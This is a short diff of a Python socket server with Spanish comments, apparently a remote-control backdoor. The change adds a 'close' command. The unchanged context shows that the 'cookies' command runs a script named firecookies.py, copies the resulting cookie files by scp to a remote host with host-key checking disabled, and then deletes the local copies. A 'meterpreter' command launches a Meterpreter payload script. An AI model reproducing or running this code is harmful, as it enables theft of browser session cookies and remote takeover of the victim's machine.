@@ -40,8 +40,10 @@ while True:
  
     #Si se reciben datos nos muestra la IP y el mensaje recibido
     #print str(addr[0]) + " dice: ", recibido
-    
-	if recibido == "cookies":
+	if recibido == "close":
+		connstream.send("Adios.")
+	
+	elif recibido == "cookies":
 		os.system("python firecookies.py")	
 		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.cks manavi@192.168.222.9:~/cookies/ 1>/dev/null')
 		os.system('rm -f /tmp/*.cks')
@@ -84,6 +86,7 @@ while True:
 	elif recibido == "meterpreter":
 		os.system("python meterpreter6666.py")
 		connstream.send("Meterpreter Ejecutado")
+
 
         #Devolvemos el mensaje de error al cliente
 	else :
